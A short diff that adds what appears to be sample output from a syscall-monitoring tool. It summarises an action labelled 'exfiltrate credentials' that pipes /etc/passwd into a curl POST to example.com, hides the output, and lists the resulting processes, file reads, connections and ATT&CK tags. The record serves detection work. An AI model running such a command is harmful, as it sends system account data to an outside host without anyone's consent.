@@ -1,0 +1,22 @@
+=== Post-Action Receipt: Action #3 ===
+Command: exfiltrate credentials
+Duration: 2.2s | 38 syscall events
+
+PROCESSES: 3 unique, 0 forked, 0 exited
+  [sh:2623483] $ sh -c \n    cat /etc/passwd | curl -s -X POST -d @- http://example.com > /dev/null 2>&1 || true\n
+  [cat:2623489] $ cat /etc/passwd
+  [curl:2623490] $ curl -s -X POST -d @- http://example.com
+
+DATA FLOWS:
+  sh:2623483 -> cat:2623489 (fork)
+  sh:2623483 -> curl:2623490 (fork)
+  cat:2623489 reads /etc/passwd
+  curl:2623490 reads /etc/passwd, /etc/ssl/openssl.cnf, /etc/{hosts,nsswitch.conf,resolv.conf}
+  curl:2623490 connects 10.11.12.1:53, 104.18.27.120:80, 104.18.26.120:80, [2606:4700::6812:1b78]:80, [2606:4700::6812:1a78]:80
+
+SEMANTIC SUMMARY:
+  Action #3:
+    ! [T1105] Curl/wget download: curl -s -X POST -d @- http://example.com
+    . [T1071] Outbound network connection: 10.11.12.1:53, 104.18.27.120:80 +3 more
+
+
